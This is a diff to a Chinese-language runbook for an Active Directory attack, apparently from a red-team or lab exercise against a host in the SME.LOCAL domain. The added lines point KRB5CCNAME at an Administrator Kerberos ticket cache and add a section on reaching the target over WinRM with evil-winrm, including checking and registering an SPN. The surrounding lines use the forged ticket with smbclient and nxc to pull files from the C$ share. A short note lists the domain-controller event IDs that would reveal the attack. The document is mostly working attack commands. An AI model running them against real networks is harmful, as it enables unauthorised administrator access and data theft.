@@ -145,6 +145,7 @@ export KRB5CCNAME="./Administrator@cifs_EC2AMAZ-V903HM1.sme.local@SME.LOCAL.ccac
   ```
 - Impacket smbclient（連線走目標 IP；Kerberos 身分保留 FQDN）：
   ```bash
+  export KRB5CCNAME=/home/kali/tools/impacket/administrator.ccache
   proxychains4 python3 examples/smbclient.py -k -no-pass \
     -target-ip 10.0.2.200 SME.LOCAL/Administrator@EC2AMAZ-V903HM1.sme.local
   ```
@@ -152,6 +153,22 @@ export KRB5CCNAME="./Administrator@cifs_EC2AMAZ-V903HM1.sme.local@SME.LOCAL.ccac
   ```bash
   proxychains4 nxc smb EC2AMAZ-V903HM1.sme.local -u Administrator -k --use-kcache -d SME.LOCAL --get-file C$\\Windows\\System32\\drivers\\etc\\hosts ./hosts.txt
   ```
+
+## 5.1 (選用) WinRM 存取 (需 SPN)
+若要使用 WinRM (evil-winrm)，目標必須註冊 `HTTP` 或 `WSMAN` SPN。
+Kerberos 錯誤 `KDC_ERR_BADOPTION` 通常表示目標缺少 SPN。
+
+1. **確認/註冊 SPN (需有權限帳號)**:
+   ```bash
+   # 檢查
+   proxychains4 python3 examples/GetUserSPNs.py -k -no-pass -target-domain SME.LOCAL -usersfile <(echo "EC2AMAZ-V903HM1$")
+   # 註冊 (若有權限)
+   # setspn -S http/EC2AMAZ-V903HM1.sme.local EC2AMAZ-V903HM1
+   ```
+2. **連線 (evil-winrm)**:
+   ```bash
+   proxychains4 evil-winrm -i <TARGET_FQDN> -r SME.LOCAL
+   ```
 
 ## EDR/事件驗證重點
 - DC：5136（RBCD 屬性變更）、4769（S4U2Proxy 對 CIFS TGS）
